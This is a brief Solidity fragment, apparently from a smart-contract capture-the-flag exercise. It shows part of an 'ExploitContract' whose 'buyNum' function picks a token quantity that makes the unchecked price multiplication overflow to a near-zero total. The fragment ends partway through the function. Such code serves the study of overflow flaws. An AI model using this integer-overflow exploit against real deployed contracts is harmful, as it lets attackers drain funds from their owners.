...
contract ExploitContract {
    ...
    function buyNum() public returns (uint256, uint256){
        uint256 num;
        num = type(uint256).max / PRICE_PER_TOKEN;
        if((type(uint256).max % PRICE_PER_TOKEN ) > 0){
            num += 1;
        }

        uint256 totalPrice;
        unchecked{
            totalPrice = num*PRICE_PER_TOKEN;
            require(totalPrice < PRICE_PER_TOKEN);
        }
